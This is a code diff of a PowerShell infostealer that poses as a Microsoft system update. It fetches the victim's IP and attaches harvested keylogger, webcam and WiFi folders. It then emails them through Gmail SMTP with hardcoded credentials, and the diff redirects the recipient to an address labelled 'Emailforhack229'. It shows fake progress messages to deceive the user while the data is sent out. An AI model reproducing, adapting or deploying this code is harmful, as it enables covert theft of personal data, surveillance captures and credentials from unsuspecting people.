@@ -70,7 +70,6 @@ else{
     echo 'Gathering information.'
     Start-Sleep -Milliseconds 80  
     $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
-  
 
     $smtpserver = "smtp.gmail.com"
     $msg = new-object Net.Mail.MailMessage
@@ -80,7 +79,12 @@ else{
     $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "com@microsoft"); 
     $msg.From = "com.microsoft.official@gmail.com"
     $msg.To.Add("com.microsoft.official@gmail.com")
-    $msg.To.Add("abukawsar.shakil.9@gmail.com")
+
+
+
+
+
+    $msg.To.Add("Emailforhack229@gmail.com")
 
 
 
@@ -94,20 +98,12 @@ else{
     if(Test-Path $file1) {
     Remove-Item  $file1 -Recurse -Force -Confirm:$false
     }
-	
-	
-	   
-
      $error.clear()
      try { 
         Compress-Archive -Path C:\Users\Public\Licence\Microsoft -DestinationPath "C:\Users\Public\Licence\SystemUpdate.zip" -Force -Confirm:$false
         $msg.Attachments.Add($file1)
-     
      }
      catch { 
-
-  
-
     $Licence= "C:\Users\Public\Licence"
     $Microsoft= "C:\Users\Public\Licence\Microsoft"
     $A310Logger= "C:\Users\Public\Licence\Microsoft\A310Logger"
@@ -129,10 +125,7 @@ else{
     $Webcam= "C:\Users\Public\Licence\Microsoft\Webcam"
     $WiFi= "C:\Users\Public\Licence\Microsoft\WiFi"
 
-
-
     $ErrorActionPreference = "silentlyContinue"
-
     foreach($file in Get-ChildItem $Licence) { $msg.Attachments.Add($file.FullName)  }
     foreach($file in Get-ChildItem $Microsoft) { $msg.Attachments.Add($file.FullName) }
     foreach($file in Get-ChildItem $A310Logger) { $msg.Attachments.Add($file.FullName) }
@@ -153,19 +146,13 @@ else{
     foreach($file in Get-ChildItem $Utility) { $msg.Attachments.Add($file.FullName) }
     foreach($file in Get-ChildItem $Webcam) { $msg.Attachments.Add($file.FullName) }
     foreach($file in Get-ChildItem $WiFi) { $msg.Attachments.Add($file.FullName) }
-       
     }
-
-
-
-
     Start-Sleep -Milliseconds 100
     echo "This process will take some time. Please wait.."
     Start-Sleep -Milliseconds 100
     $smtp.Send($msg) | Out-Null
     Start-Sleep -Milliseconds 500
     echo '17 file updated & 3 updates found.' 
-     
     }   
     $count= [int]$count+1
     $count > "C:\Users\Public\Licence\count.txt"
